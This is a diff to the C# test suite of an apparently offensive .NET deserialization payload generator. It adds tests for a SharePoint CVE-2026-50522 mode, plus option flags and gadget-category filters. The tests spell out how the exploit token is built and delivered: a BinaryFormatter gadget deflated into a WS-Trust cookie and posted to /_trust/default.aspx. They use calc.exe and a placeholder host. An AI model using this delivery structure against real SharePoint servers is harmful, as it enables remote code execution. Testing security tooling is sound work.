@@ -84,6 +84,13 @@ namespace ysonet.Tests
             Run("DotNetNuke modes select the payload mode and pass the right args", DotNetNukeModes);
             Run("Clipboard modes scope format vs xamlvariant per mode", ClipboardModes);
             Run("SharePoint modes select the CVE and scope its inner setting", SharePointModes);
+            Run("SharePoint CVE-2026-50522 default output is the wresult token plus a delivery comment", SharePointCve2026Framing);
+            Run("SharePoint CVE-2026-50522 --formbody emits the full wa/wctx/wresult body", SharePointCve2026FormBody);
+            Run("SharePoint CVE-2026-50522 validates its target and gadget inputs", SharePointCve2026Validation);
+            Run("SharePoint --no-comment suppresses the explanatory comment", SharePointNoComment);
+            Run("SharePoint honors --rawcmd instead of hardcoding it", SharePointRawcmdConfigurable);
+            Run("ApplicationTrust --no-comment outputs clean XML", ApplicationTrustNoComment);
+            Run("Command plugins expose --rawcmd (and SharePoint --minify/--ust/--no-comment)", CommandPluginsExposeConfigFlags);
             Run("A space sets an explicit empty string, distinct from unset", ExplicitEmptyStringViaSpace);
             Run("Interactive banner marks beta and shows the version", BannerShowsBetaAndVersion);
             Run("Show-command action prints the one-liner without generating", WizardShowCommand);
@@ -127,6 +134,41 @@ namespace ysonet.Tests
             Run("NetNonRceGadgets Xaml payloads are minified with --minify", NetNonRceXamlMinifies);
             Run("Every gadget generates a non-empty payload from valid inputs", EveryGadgetGeneratesAPayload);
             Run("Every safe plugin generates a payload; the rest are explicitly excluded", EverySafePluginGeneratesAPayload);
+
+            // ---- Category facets (metadata + discovery) ----
+            Run("Facet vocabulary is broad, unique, and labelled", FacetVocabularyIsBroadAndValid);
+            Run("Every gadget expands to normalized capability units", EveryGadgetExpandsToCapabilities);
+            Run("Default facets are honest (uncategorized + derived input)", DefaultFacetsAreHonest);
+            Run("Input derivation covers all CommandInputType values", InputDerivationCoversCommandInputTypes);
+            Run("Explicit inputs replace the derived input", ExplicitInputsReplaceDerivedInput);
+            Run("Uncategorized cannot mix with a real value; unknowns rejected", UncategorizedCannotMix);
+            Run("Variant facets inherit or fully override the gadget set", VariantFacetInheritanceAndOverride);
+            Run("Variant formatter exclusions reach capability units", VariantFormatterAndInputAreEffective);
+            Run("One capability must satisfy every axis (no cross-variant match)", OneCapabilityMustMatchAllAxes);
+            Run("Multiple values OR within an axis; axes AND across", MultipleValuesUnionAndAxesIntersection);
+            Run("Representative gadget facets are locked (audit table)", ExistingFacetAudit);
+            Run("Category query parses all axes case-insensitively", CategoryQueryParsesAllAxes);
+            Run("Category query rejects malformed values with guidance", CategoryQueryRejectsMalformedValues);
+            Run("Category query collapses duplicates", CategoryQueryCombinesSelections);
+            Run("Program.options collects repeated --category values", CategoryOptionParsesRepeated);
+            Run("Filtered gadget list is sorted machine-readable names", FilteredGadgetListIsMachineReadable);
+            Run("Unfiltered gadget list is unchanged by the overload", UnfilteredGadgetListIsUnchanged);
+            Run("Category search shows matching units and reports no matches", CategoryCommandShowsMatchingUnitsAndNoMatches);
+            Run("Category CLI dispatch: search, list, and mode rejection", CategoryCliDispatch);
+            Run("Help shows compact and detailed categories", HelpShowsCategories);
+
+            // ---- Interactive category filter ----
+            Run("Filter model: default all, union, intersection, counts", CategoryFilterModelBehaviors);
+            Run("Filter driver selects a value and persists it in the session", CategoryFilterDriverSelectsAndPersists);
+            Run("Filter driver Esc discards the axis draft", CategoryFilterEscDiscardsAxisDraft);
+            Run("Filter driver Clear all resets selections", CategoryFilterClearAll);
+            Run("Filter disables values impossible under other axes", CategoryFilterDisablesImpossibleValues);
+            Run("Filter screen does not stack on a real console (redraw in place)", CategoryFilterDoesNotStack);
+            Run("Gadget preview shows the category summary", ModuleViewShowsCategorySummary);
+            Run("In-build gadget filter narrows the list and resets", GadgetFilterNarrowsAndResets);
+            Run("In-build category filter narrows the picker and generates the same payload", CategoryFilterInBuildGeneratesSamePayload);
+            Run("Plugin flow has no category screen", PluginFlowHasNoCategoryScreen);
+            Run("Existing gadget flow reaches the picker with the filter action offered", ExistingGadgetFlowReachesPickerDirectly);
 
             // FULL tier (opt-in): the exhaustive combination suite. It is slower and
             // flashes many self-closing cmd windows / binds loopback sockets, so it
@@ -1377,21 +1419,26 @@ namespace ysonet.Tests
             var editor = new ModuleEditor(null, null, false, null, null);
             var f = editor.BuildFieldsForTest("SharePoint");
             EditableField mode = FindEditable(f, "mode");
-            AssertTrue(mode != null && mode.Choices.Count == 6, "six SharePoint CVE modes");
+            AssertTrue(mode != null && mode.Choices.Count == 7, "seven SharePoint CVE modes");
             // The CVE selector is the mode picker, not a duplicate 'cve' field.
             AssertTrue(FindEditable(f, "cve") == null, "cve is the mode, not a separate field");
 
-            // Default = CVE-2025-49704: inner 'variant' shown; gadget/useurl hidden.
+            // Default = CVE-2025-49704: inner 'variant' shown; gadget/useurl/target hidden.
             AssertTrue(FindEditable(f, "command").Required, "command required");
             AssertTrue(!FindEditable(f, "variant").Hidden, "49704: inner variant shown");
             AssertTrue(FindEditable(f, "gadget").Hidden && FindEditable(f, "useurl").Hidden, "49704: gadget/useurl hidden");
+            AssertTrue(FindEditable(f, "target").Hidden, "49704: target hidden");
             FindEditable(f, "command").Value = "calc.exe"; FindEditable(f, "command").Touched = true;
             string a1 = string.Join(" ", editor.PluginArgvForTest().ToArray());
             AssertTrue(a1.Contains("--cve CVE-2025-49704"), "49704 argv has cve: " + a1);
-            AssertTrue(!a1.Contains("--gadget") && !a1.Contains("--useurl"), "49704 argv excludes gadget/useurl");
+            AssertTrue(!a1.Contains("--gadget") && !a1.Contains("--useurl") && !a1.Contains("--target"),
+                "49704 argv excludes gadget/useurl/target");
 
-            // Switch to CVE-2020-1147: inner 'gadget' shown; it generates via CLI.
-            mode.Value = mode.Choices[3];
+            // Modes are selected by their CVE identity, not a brittle list index, so
+            // adding a mode never silently shifts what these checks target.
+
+            // CVE-2020-1147: inner 'gadget' shown; it generates via CLI.
+            mode.Value = PickModeByCve(mode, "CVE-2020-1147");
             editor.RefreshDynamicForTest();
             AssertTrue(!FindEditable(f, "gadget").Hidden, "1147: gadget shown");
             AssertTrue(FindEditable(f, "variant").Hidden, "1147: variant hidden");
@@ -1400,14 +1447,351 @@ namespace ysonet.Tests
             RunResult r2 = PayloadRunner.RunPlugin("SharePoint", editor.PluginArgvForTest().ToArray());
             AssertTrue(r2.Success, "1147 generates via CLI args: " + r2.ErrorMessage);
 
-            // Switch to CVE-2018-8421: inner 'useurl' shown; it generates via CLI.
-            mode.Value = mode.Choices[5];
+            // CVE-2018-8421: inner 'useurl' shown; it generates via CLI.
+            mode.Value = PickModeByCve(mode, "CVE-2018-8421");
             editor.RefreshDynamicForTest();
             AssertTrue(!FindEditable(f, "useurl").Hidden, "8421: useurl shown");
             string a3 = string.Join(" ", editor.PluginArgvForTest().ToArray());
             AssertTrue(a3.Contains("--cve CVE-2018-8421"), "8421 argv: " + a3);
             RunResult r3 = PayloadRunner.RunPlugin("SharePoint", editor.PluginArgvForTest().ToArray());
             AssertTrue(r3.Success, "8421 generates via CLI args: " + r3.ErrorMessage);
+
+            // CVE-2026-50522: command, target, gadget, and the formbody switch shown;
+            // only command is required (target is transport, needed just for --formbody).
+            // The unrelated variant/useurl fields stay hidden. Argv carries the cve,
+            // target, and gadget, and it generates via CLI (default = wresult token).
+            mode.Value = PickModeByCve(mode, "CVE-2026-50522");
+            editor.RefreshDynamicForTest();
+            AssertTrue(!FindEditable(f, "command").Hidden && !FindEditable(f, "target").Hidden
+                && !FindEditable(f, "gadget").Hidden && !FindEditable(f, "formbody").Hidden,
+                "2026-50522: command/target/gadget/formbody shown");
+            AssertTrue(FindEditable(f, "command").Required && !FindEditable(f, "target").Required,
+                "2026-50522: command required, target optional");
+            AssertTrue(FindEditable(f, "variant").Hidden && FindEditable(f, "useurl").Hidden,
+                "2026-50522: variant/useurl hidden");
+            FindEditable(f, "command").Value = "calc.exe"; FindEditable(f, "command").Touched = true;
+            FindEditable(f, "target").Value = "https://sharepoint.example/"; FindEditable(f, "target").Touched = true;
+            string a4 = string.Join(" ", editor.PluginArgvForTest().ToArray());
+            AssertTrue(a4.Contains("--cve CVE-2026-50522") && a4.Contains("--target") && a4.Contains("--gadget"),
+                "2026-50522 argv: " + a4);
+            RunResult r4 = PayloadRunner.RunPlugin("SharePoint", editor.PluginArgvForTest().ToArray());
+            AssertTrue(r4.Success, "2026-50522 generates via CLI args: " + r4.ErrorMessage);
+        }
+
+        // Selects a SharePoint interactive mode by its CVE identity (the mode Name),
+        // so adding a mode never silently shifts a positional index.
+        private static string PickModeByCve(EditableField mode, string cveId)
+        {
+            foreach (string choice in mode.Choices)
+                if (choice.IndexOf(cveId, StringComparison.OrdinalIgnoreCase) >= 0)
+                    return choice;
+            throw new Exception("no SharePoint mode choice found for " + cveId);
+        }
+
+        // CVE-2026-50522 DEFAULT output framing. The default is the wresult token XML plus
+        // a delivery comment (like the other SharePoint modes), NOT a form body. Inspects
+        // the token layer by layer (RSTR/SCT XML -> Base64 -> deflate -> BF header) WITHOUT
+        // ever deserializing or firing the embedded gadget.
+        private static void SharePointCve2026Framing()
+        {
+            RunResult r = PayloadRunner.RunPlugin("SharePoint", new[]
+            {
+                "--cve", "CVE-2026-50522",
+                "--target", "https://sharepoint.example/",
+                "--gadget", "TypeConfuseDelegate",
+                "-c", "calc.exe",
+            });
+            AssertTrue(r.Success, "2026-50522 generates: " + r.ErrorMessage);
+            string output = r.Raw as string;
+            AssertTrue(!string.IsNullOrEmpty(output), "2026-50522 returns a string");
+
+            // Default output is the token, not a form body: it must NOT start with the
+            // url-encoded wa field, and it must carry a delivery comment that shows the POST.
+            AssertTrue(!output.StartsWith("wa="), "default output is the token, not a form body: " + output);
+            int commentAt = output.IndexOf("<!--", StringComparison.Ordinal);
+            AssertTrue(commentAt > 0, "default output has a delivery comment");
+            string comment = output.Substring(commentAt);
+            AssertTrue(comment.Contains("wa=wsignin1.0") && comment.Contains("wctx=") && comment.Contains("wresult="),
+                "the comment shows the wa/wctx/wresult fields");
+            AssertTrue(comment.Contains("/_trust/default.aspx"), "the comment names the trust endpoint");
+            AssertTrue(comment.Contains("--formbody"), "the comment points at --formbody for the full body");
+            // The provided --target is echoed as the wctx example in the comment.
+            AssertTrue(comment.Contains("wctx=https://sharepoint.example/"), "the comment uses the given target as the wctx example: " + comment);
+
+            // The part before the comment is the wresult token XML. Inspect it in depth.
+            string wresult = output.Substring(0, commentAt).Trim();
+            AssertTrue(XmlWellFormednessError(wresult) == null, "wresult is well-formed XML");
+            AssertSharePoint2026TokenStructure(wresult);
+        }
+
+        // CVE-2026-50522 --formbody output framing. This mode emits the complete
+        // URL-encoded wa/wctx/wresult sign-in body. Inspects it layer by layer WITHOUT
+        // deserializing or firing the embedded gadget.
+        private static void SharePointCve2026FormBody()
+        {
+            RunResult r = PayloadRunner.RunPlugin("SharePoint", new[]
+            {
+                "--cve", "CVE-2026-50522",
+                "--formbody",
+                "--target", "https://sharepoint.example/",
+                "--gadget", "TypeConfuseDelegate",
+                "-c", "calc.exe",
+            });
+            AssertTrue(r.Success, "2026-50522 --formbody generates: " + r.ErrorMessage);
+            string body = r.Raw as string;
+            AssertTrue(!string.IsNullOrEmpty(body), "2026-50522 --formbody returns a string form body");
+
+            // Exactly three fields, in a deterministic order, with no trailing text.
+            string[] fields = body.Split('&');
+            AssertTrue(fields.Length == 3, "form body has exactly three fields: " + body);
+            AssertTrue(fields[0].StartsWith("wa=") && fields[1].StartsWith("wctx=") && fields[2].StartsWith("wresult="),
+                "form fields are wa, wctx, wresult in order: " + body);
+
+            string wa = System.Web.HttpUtility.UrlDecode(fields[0].Substring("wa=".Length));
+            string wctx = System.Web.HttpUtility.UrlDecode(fields[1].Substring("wctx=".Length));
+            string wresult = System.Web.HttpUtility.UrlDecode(fields[2].Substring("wresult=".Length));
+
+            AssertEqual("wsignin1.0", wa, "wa is the sign-in action");
+            AssertEqual("https://sharepoint.example/", wctx, "wctx is the normalized target base URL");
+            AssertTrue(XmlWellFormednessError(wresult) == null, "wresult is well-formed XML");
+            AssertSharePoint2026TokenStructure(wresult);
+        }
+
+        // Parses a CVE-2026-50522 wresult token safely (no DTD) and asserts the
+        // trust/SCT/cookie structure, the identifier shape, and that the cookie inflates
+        // to a BinaryFormatter stream. Never deserializes the payload.
+        private static void AssertSharePoint2026TokenStructure(string wresult)
+        {
+            var doc = new System.Xml.XmlDocument();
+            using (var xr = System.Xml.XmlReader.Create(new StringReader(wresult),
+                new System.Xml.XmlReaderSettings { DtdProcessing = System.Xml.DtdProcessing.Prohibit }))
+            {
+                doc.Load(xr);
+            }
+
+            const string nsTrust = "http://schemas.xmlsoap.org/ws/2005/02/trust";
+            const string nsSc = "http://schemas.xmlsoap.org/ws/2005/02/sc";
+            const string nsSecurity = "http://schemas.microsoft.com/ws/2006/05/security";
+
+            System.Xml.XmlElement rstr = doc.DocumentElement;
+            AssertEqual("RequestSecurityTokenResponse", rstr.LocalName, "root is RequestSecurityTokenResponse");
+            AssertEqual(nsTrust, rstr.NamespaceURI, "RSTR is in the trust namespace");
+
+            System.Xml.XmlElement requested = FirstChildElement(rstr);
+            AssertEqual("RequestedSecurityToken", requested.LocalName, "RSTR wraps RequestedSecurityToken");
+            AssertEqual(nsTrust, requested.NamespaceURI, "RequestedSecurityToken is in the trust namespace");
+
+            System.Xml.XmlElement sct = FirstChildElement(requested);
+            AssertEqual("SecurityContextToken", sct.LocalName, "it holds a SecurityContextToken");
+            AssertEqual(nsSc, sct.NamespaceURI, "SCT is in the security-context namespace");
+
+            System.Xml.XmlElement identifier = ChildByLocalName(sct, "Identifier");
+            AssertTrue(identifier != null && identifier.NamespaceURI == nsSc, "SCT has an Identifier in the sc namespace");
+            System.Xml.XmlElement cookie = ChildByLocalName(sct, "Cookie");
+            AssertTrue(cookie != null && cookie.NamespaceURI == nsSecurity, "SCT has a Cookie in the security namespace");
+
+            // Identifier shape: urn:unique-id:securitycontext:<32 lowercase hex Guid chars>.
+            const string idPrefix = "urn:unique-id:securitycontext:";
+            string id = identifier.InnerText.Trim();
+            AssertTrue(id.StartsWith(idPrefix, StringComparison.Ordinal), "identifier has the urn prefix: " + id);
+            string guidPart = id.Substring(idPrefix.Length);
+            AssertTrue(guidPart.Length == 32, "identifier ends with a 32-char Guid: " + id);
+            foreach (char ch in guidPart)
+                AssertTrue((ch >= '0' && ch <= '9') || (ch >= 'a' && ch <= 'f'), "Guid N is lowercase hex: " + id);
+
+            // Cookie = Base64(Deflate(BinaryFormatter gadget)). Decode and inflate, then
+            // assert a BinaryFormatter stream header. Never deserialize it.
+            byte[] deflated = Convert.FromBase64String(cookie.InnerText.Trim());
+            byte[] bf;
+            using (var input = new MemoryStream(deflated))
+            using (var ds = new System.IO.Compression.DeflateStream(input, System.IO.Compression.CompressionMode.Decompress))
+            using (var output = new MemoryStream())
+            {
+                ds.CopyTo(output);
+                bf = output.ToArray();
+            }
+            byte[] head = new byte[] { 0, 1, 0, 0, 0, 255, 255, 255, 255 };
+            bool okHead = bf.Length > head.Length;
+            for (int i = 0; okHead && i < head.Length; i++) if (bf[i] != head[i]) okHead = false;
+            AssertTrue(okHead, "the cookie inflates to a BinaryFormatter stream");
+        }
+
+        // CVE-2026-50522 input validation. Every case inspects the error, never a payload.
+        private static void SharePointCve2026Validation()
+        {
+            const string goodTarget = "https://sharepoint.example/";
+
+            // A valid run first, so leftover statics cannot make a negative case pass by
+            // accident later. This also proves the default (token) happy path from the CLI.
+            RunResult ok = RunSharePoint2026("calc.exe", goodTarget, "TypeConfuseDelegate", true);
+            AssertTrue(ok.Success, "valid 2026-50522 run succeeds: " + ok.ErrorMessage);
+
+            // The default token output does NOT need --target (wctx is transport only).
+            RunResult noTargetDefault = RunSharePoint2026("calc.exe", null, "TypeConfuseDelegate", false);
+            AssertTrue(noTargetDefault.Success, "default token output works without --target: " + noTargetDefault.ErrorMessage);
+            AssertTrue(!(noTargetDefault.Raw as string).StartsWith("wa="), "default output without --target is the token, not a form body");
+
+            // --formbody DOES require --target (it fills wctx).
+            RunResult formNoTarget = RunSharePoint2026("calc.exe", null, "TypeConfuseDelegate", false, true);
+            AssertTrue(!formNoTarget.Success && formNoTarget.ErrorMessage.IndexOf("target", StringComparison.OrdinalIgnoreCase) >= 0,
+                "--formbody without --target is rejected: " + formNoTarget.ErrorMessage);
+
+            // --formbody with a good target succeeds and yields a url-encoded form body.
+            RunResult formOk = RunSharePoint2026("calc.exe", goodTarget, "TypeConfuseDelegate", true, true);
+            AssertTrue(formOk.Success && (formOk.Raw as string).StartsWith("wa="),
+                "--formbody with --target yields a form body: " + formOk.ErrorMessage);
+
+            // Relative target.
+            RunResult relative = RunSharePoint2026("calc.exe", "/sites/x", "TypeConfuseDelegate", true);
+            AssertTrue(!relative.Success && relative.ErrorMessage.IndexOf("absolute", StringComparison.OrdinalIgnoreCase) >= 0,
+                "relative target is rejected: " + relative.ErrorMessage);
+
+            // Non-HTTP(S) target.
+            RunResult ftp = RunSharePoint2026("calc.exe", "ftp://host/", "TypeConfuseDelegate", true);
+            AssertTrue(!ftp.Success && ftp.ErrorMessage.IndexOf("http", StringComparison.OrdinalIgnoreCase) >= 0,
+                "non-http target is rejected: " + ftp.ErrorMessage);
+
+            // Target with a query string, a fragment, or user info.
+            RunResult query = RunSharePoint2026("calc.exe", "https://host/?a=1", "TypeConfuseDelegate", true);
+            AssertTrue(!query.Success, "target with query is rejected: " + query.ErrorMessage);
+            RunResult frag = RunSharePoint2026("calc.exe", "https://host/#x", "TypeConfuseDelegate", true);
+            AssertTrue(!frag.Success, "target with fragment is rejected: " + frag.ErrorMessage);
+            RunResult userinfo = RunSharePoint2026("calc.exe", "https://user:pass@host/", "TypeConfuseDelegate", true);
+            AssertTrue(!userinfo.Success, "target with user info is rejected: " + userinfo.ErrorMessage);
+
+            // Unknown gadget.
+            RunResult unknownGadget = RunSharePoint2026("calc.exe", goodTarget, "NoSuchGadget_2026", true);
+            AssertTrue(!unknownGadget.Success && unknownGadget.ErrorMessage.IndexOf("Gadget", StringComparison.OrdinalIgnoreCase) >= 0,
+                "unknown gadget is rejected: " + unknownGadget.ErrorMessage);
+
+            // Known gadget without BinaryFormatter support (ObjectDataProvider is Xaml/Json only).
+            RunResult noBf = RunSharePoint2026("calc.exe", goodTarget, "ObjectDataProvider", true);
+            AssertTrue(!noBf.Success && noBf.ErrorMessage.IndexOf("BinaryFormatter", StringComparison.OrdinalIgnoreCase) >= 0,
+                "a gadget without BinaryFormatter support is rejected: " + noBf.ErrorMessage);
+
+            // Missing command (reset the static so a leftover value cannot satisfy it).
+            ResetStaticString(typeof(ysonet.Plugins.SharePointPlugin), "command", "");
+            RunResult noCommand = PayloadRunner.RunPlugin("SharePoint", new[]
+            {
+                "--cve", "CVE-2026-50522", "--target", goodTarget, "--gadget", "TypeConfuseDelegate",
+            });
+            AssertTrue(!noCommand.Success, "missing command is rejected: " + noCommand.ErrorMessage);
+
+            // An older SharePoint mode still works without --target, proving the option
+            // is mode-specific and did not leak in as a global requirement.
+            RunResult older = PayloadRunner.RunPlugin("SharePoint", new[] { "--cve", "CVE-2018-8421", "-c", "calc.exe" });
+            AssertTrue(older.Success, "an older SharePoint CVE still generates without --target: " + older.ErrorMessage);
+        }
+
+        // Runs SharePoint CVE-2026-50522 with explicit inputs. Resets the leaky static
+        // command/gadget fields first so each call is order-independent; production
+        // already resets target on every run. When target is null, --target is omitted.
+        private static RunResult RunSharePoint2026(string command, string target, string gadget, bool passTarget, bool useFormBody = false)
+        {
+            ResetStaticString(typeof(ysonet.Plugins.SharePointPlugin), "command", "");
+            ResetStaticString(typeof(ysonet.Plugins.SharePointPlugin), "gadget", "TypeConfuseDelegate");
+            // The formBody static is reset by the plugin on every run, so each call is
+            // order-independent regardless of a prior --formbody run.
+            var argv = new List<string> { "--cve", "CVE-2026-50522", "-c", command, "--gadget", gadget };
+            if (useFormBody) argv.Add("--formbody");
+            if (passTarget && target != null)
+            {
+                argv.Add("--target");
+                argv.Add(target);
+            }
+            return PayloadRunner.RunPlugin("SharePoint", argv.ToArray());
+        }
+
+        // --no-comment strips the trailing explanatory HTML comment from SharePoint
+        // output, for a comment-bearing CVE (2020-1147, no external DLLs) and for the
+        // 2026 token. Without the flag the comment is present.
+        private static void SharePointNoComment()
+        {
+            RunResult withC = PayloadRunner.RunPlugin("SharePoint", new[] { "--cve", "CVE-2020-1147", "-c", "calc.exe" });
+            AssertTrue(withC.Success, "2020-1147 generates: " + withC.ErrorMessage);
+            AssertTrue((withC.Raw as string).Contains("<!--"), "default output includes the explanatory comment");
+
+            RunResult noC = PayloadRunner.RunPlugin("SharePoint", new[] { "--cve", "CVE-2020-1147", "-c", "calc.exe", "--no-comment" });
+            AssertTrue(noC.Success, "2020-1147 --no-comment generates: " + noC.ErrorMessage);
+            AssertTrue(!(noC.Raw as string).Contains("<!--"), "--no-comment removes the explanatory comment");
+
+            // The 2026 default token also drops its delivery comment and returns just the token.
+            RunResult tok = PayloadRunner.RunPlugin("SharePoint", new[] { "--cve", "CVE-2026-50522", "-c", "calc.exe", "--no-comment" });
+            AssertTrue(tok.Success, "2026-50522 --no-comment generates: " + tok.ErrorMessage);
+            string tokS = tok.Raw as string;
+            AssertTrue(!tokS.Contains("<!--") && tokS.StartsWith("<RequestSecurityTokenResponse"),
+                "2026-50522 --no-comment returns just the wresult token: " + tokS);
+        }
+
+        // rawcmd is threaded into the SharePoint gadget, not hardcoded: toggling it changes
+        // the embedded command (cmd /c X vs X), hence the payload bytes. Compare the raw
+        // payload (via --no-comment so only the payload differs, not any comment text).
+        private static void SharePointRawcmdConfigurable()
+        {
+            RunResult def = PayloadRunner.RunPlugin("SharePoint", new[] { "--cve", "CVE-2020-1147", "-c", "calc.exe", "--no-comment" });
+            RunResult raw = PayloadRunner.RunPlugin("SharePoint", new[] { "--cve", "CVE-2020-1147", "-c", "calc.exe", "--no-comment", "--rawcmd" });
+            AssertTrue(def.Success && raw.Success, "both 2020-1147 runs generate");
+            AssertTrue((def.Raw as string) != (raw.Raw as string),
+                "--rawcmd changes the SharePoint payload (the flag is honored, not hardcoded)");
+        }
+
+        // ApplicationTrust embeds an optional commented-out block; --no-comment drops it,
+        // leaving clean ApplicationTrust XML.
+        private static void ApplicationTrustNoComment()
+        {
+            RunResult with = PayloadRunner.RunPlugin("ApplicationTrust", new[] { "-c", "calc.exe" });
+            AssertTrue(with.Success && (with.Raw as string).Contains("<!--"),
+                "ApplicationTrust default includes the comment: " + with.ErrorMessage);
+            RunResult without = PayloadRunner.RunPlugin("ApplicationTrust", new[] { "-c", "calc.exe", "--no-comment" });
+            AssertTrue(without.Success, "ApplicationTrust --no-comment generates: " + without.ErrorMessage);
+            string s = without.Raw as string;
+            AssertTrue(!s.Contains("<!--") && s.Contains("<ApplicationTrust"),
+                "--no-comment leaves clean ApplicationTrust XML with no comment: " + s);
+        }
+
+        // Every command-taking plugin exposes --rawcmd (consistency with ViewState), and
+        // SharePoint additionally exposes --minify/--usesimpletype/--no-comment. Locks in
+        // the config-flag consistency so a future plugin cannot silently hardcode them.
+        private static void CommandPluginsExposeConfigFlags()
+        {
+            string[] cmdPlugins =
+            {
+                "Resx", "DotNetNuke", "ApplicationTrust", "Altserialization", "Clipboard",
+                "TransactionManagerReenlist", "SessionSecurityTokenHandler",
+                "MachineKeySessionSecurityTokenHandler", "ViewState", "SharePoint",
+            };
+            foreach (string p in cmdPlugins)
+            {
+                IPlugin inst = PluginRegistry.CreatePluginInstance(p);
+                AssertTrue(inst != null, p + " loads");
+                var fields = OptionField.FromOptionSet(inst.Options());
+                AssertTrue(FindField(fields, "rawcmd") != null, p + " exposes --rawcmd");
+            }
+
+            var spFields = OptionField.FromOptionSet(PluginRegistry.CreatePluginInstance("SharePoint").Options());
+            AssertTrue(FindField(spFields, "minify") != null, "SharePoint exposes --minify");
+            AssertTrue(FindField(spFields, "usesimpletype") != null, "SharePoint exposes --ust/--usesimpletype");
+            AssertTrue(FindField(spFields, "no-comment") != null, "SharePoint exposes --no-comment");
+        }
+
+        private static void ResetStaticString(Type t, string field, string value)
+        {
+            var f = t.GetField(field, System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
+            if (f != null && f.FieldType == typeof(string)) f.SetValue(null, value);
+        }
+
+        private static System.Xml.XmlElement FirstChildElement(System.Xml.XmlElement parent)
+        {
+            foreach (System.Xml.XmlNode n in parent.ChildNodes)
+                if (n is System.Xml.XmlElement) return (System.Xml.XmlElement)n;
+            throw new Exception("no child element under " + parent.LocalName);
+        }
+
+        private static System.Xml.XmlElement ChildByLocalName(System.Xml.XmlElement parent, string localName)
+        {
+            foreach (System.Xml.XmlNode n in parent.ChildNodes)
+                if (n is System.Xml.XmlElement && n.LocalName == localName) return (System.Xml.XmlElement)n;
+            return null;
         }
 
         private static void BannerShowsBetaAndVersion()
@@ -1597,9 +1981,15 @@ namespace ysonet.Tests
             // and per-cell-highlight regressions.
             var prevTerm = Term.Current;
             bool prevForce = ModuleEditor.ForceFallback;
+            var prevColors = ConsoleStyle.ColorOverrideForTest;
             var vt = new VirtualTerminal(120, 40);
             Term.Current = vt;
             ModuleEditor.ForceFallback = false; // exercise RunColumns, not the fallback
+            // This test asserts on the COLORED per-cell selection bar, so force color on
+            // for its scope: otherwise a NO_COLOR environment (the no-color.org
+            // convention that ConsoleStyle honors) suppresses the background and there is
+            // no bar to find. Restored in finally.
+            ConsoleStyle.ColorOverrideForTest = true;
             try
             {
                 var keys = new RecordingKeyReader(vt);
@@ -1641,6 +2031,7 @@ namespace ysonet.Tests
             {
                 Term.Current = prevTerm;
                 ModuleEditor.ForceFallback = prevForce;
+                ConsoleStyle.ColorOverrideForTest = prevColors;
             }
         }
 
@@ -3672,6 +4063,9 @@ namespace ysonet.Tests
                 new PluginCell("SharePoint", new[] { "--cve", "CVE-2025-49704", "-c", csFixture, "--variant", "2" }),
                 // CVE-2025-53770 (ToolShell patch bypass) compiles -c as a .cs file, like 49704 variant 2.
                 new PluginCell("SharePoint", new[] { "--cve", "CVE-2025-53770", "-c", csFixture }),
+                // CVE-2026-50522 needs an explicit --target (the wctx base URL) and a BinaryFormatter gadget.
+                new PluginCell("SharePoint", new[] { "--cve", "CVE-2026-50522", "--target", "https://sharepoint.example/", "--gadget", "TypeConfuseDelegate", "-c", "calc.exe" }),
+                new PluginCell("SharePoint", new[] { "--cve", "CVE-2026-50522", "--formbody", "--target", "https://sharepoint.example/", "--gadget", "TypeConfuseDelegate", "-c", "calc.exe" }),
 
                 // Remote-DLL-load gadgets with a natural UNC path: the plugin JSON-escapes the
                 // input by default now, so the backslashes survive generation and the --minify
@@ -4463,6 +4857,638 @@ namespace ysonet.Tests
         {
             if (!object.Equals(expected, actual))
                 throw new Exception(msg + " (expected '" + expected + "', got '" + actual + "')");
+        }
+
+        // ---- Category facet tests ---------------------------------------------
+
+        private static void FacetVocabularyIsBroadAndValid()
+        {
+            foreach (var vocab in new[] { PayloadKind.All, PayloadInput.All, GadgetRequirement.All })
+            {
+                AssertTrue(vocab.Length >= 5, "an axis has a broad vocabulary");
+                var seen = new HashSet<string>(StringComparer.Ordinal);
+                foreach (string v in vocab)
+                {
+                    AssertTrue(!string.IsNullOrEmpty(v), "no empty vocabulary value");
+                    AssertTrue(seen.Add(v), "vocabulary value '" + v + "' is unique");
+                    AssertTrue(!string.IsNullOrEmpty(GadgetFacetReader.Label(v)), "value '" + v + "' has a label");
+                }
+                AssertTrue(seen.Contains("uncategorized"), "axis includes uncategorized");
+                AssertTrue(seen.Contains("other"), "axis includes other");
+            }
+            // The removed, over-narrow effect/target values must not have crept back.
+            foreach (string gone in new[] { "file-delete", "ntlm-smb", "dns", "working-directory-change", "target-location" })
+                foreach (var vocab in new[] { PayloadKind.All, PayloadInput.All, GadgetRequirement.All })
+                    AssertTrue(Array.IndexOf(vocab, gone) < 0, "removed value '" + gone + "' is absent");
+        }
+
+        private static void EveryGadgetExpandsToCapabilities()
+        {
+            var all = GadgetFacetReader.ExpandAll();
+            AssertTrue(all.Count > 25, "gadgets expand to many capability units");
+            AssertTrue(!all.Exists(c => string.Equals(c.GadgetName, "Generic", StringComparison.OrdinalIgnoreCase)),
+                "the Generic placeholder is excluded");
+
+            foreach (string name in CliListing.Gadgets())
+            {
+                IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
+                int variantCount = g.Variants() == null ? 0 : g.Variants().Count;
+                int expectedUnits = variantCount == 0 ? 1 : variantCount;
+                var units = GadgetFacetReader.Expand(g);
+                AssertEqual(expectedUnits, units.Count, name + " expands to one unit per variant");
+                foreach (var c in units)
+                {
+                    AssertTrue(c.Kinds.Count > 0, name + " has a kind");
+                    AssertTrue(c.Inputs.Count > 0, name + " has an accepted input");
+                    AssertTrue(c.Requirements.Count > 0, name + " has requirements");
+                    AssertTrue(c.Formatters.Count > 0, name + " has formatter tokens");
+                }
+            }
+        }
+
+        private static void DefaultFacetsAreHonest()
+        {
+            var def = new GadgetFacetSet();
+            AssertSetEqual(def.Kinds, new[] { "uncategorized" }, "default kind is uncategorized");
+            AssertSetEqual(def.Requirements, new[] { "uncategorized" }, "default requirements are uncategorized");
+            AssertTrue(def.Inputs == null, "default inputs are null (derive from CommandInputType)");
+
+            var cap = GadgetFacetReader.BuildCapability("X", null, null, new GadgetFacetSet(),
+                CommandInputType.ShellCommand, new List<string> { "BinaryFormatter" });
+            AssertSetEqual(cap.Kinds, new[] { "uncategorized" }, "default kind normalizes to uncategorized");
+            AssertSetEqual(cap.Inputs, new[] { PayloadInput.Command }, "shell command derives to command");
+        }
+
+        private static void InputDerivationCoversCommandInputTypes()
+        {
+            AssertEqual(PayloadInput.Command, GadgetFacetReader.DeriveInput(CommandInputType.ShellCommand), "shell->command");
